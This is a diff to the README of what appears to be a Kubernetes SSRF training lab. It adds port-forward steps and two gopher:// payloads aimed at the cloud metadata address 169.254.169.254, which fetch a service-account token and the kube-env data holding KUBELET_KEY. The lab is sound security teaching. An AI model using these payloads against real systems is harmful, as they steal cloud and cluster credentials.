@@ -39,8 +39,30 @@ kubectl apply -f manifest -R
 ```
 (Please don't expose deployment on the Internet through Service.)
 
+- Port-forward
+```
+kubectl port-forward deployment/ssrf-server 8080:8080
+```
+
 - Open Web Preview
 <img src="img/web-preview.png" width="320">
+
+- Input url (testing)
+```
+https://www.google.com
+```
+
+- Input malicious url
+  - Get instance token (doesn't use it in this training)
+```
+gopher://169.254.169.254:80/_GET /computeMetadata/v1/instance/service-accounts/default/token HTTP/1.1%0d%0aMetadata-Flavor: Google%0d%0aConnection: Close%0d%0a%0d%0a
+```
+
+  - Get kubelet key
+```
+gopher://169.254.169.254:80/_GET /computeMetadata/v1/instance/attributes/kube-env?alt=json HTTP/1.1%0d%0aMetadata-Flavor: Google%0d%0aConnection: Close%0d%0a%0d%0a
+```
+It contains "KUBELET_KEY".
 
 ### (After this training) Clean cluster
 ```bash
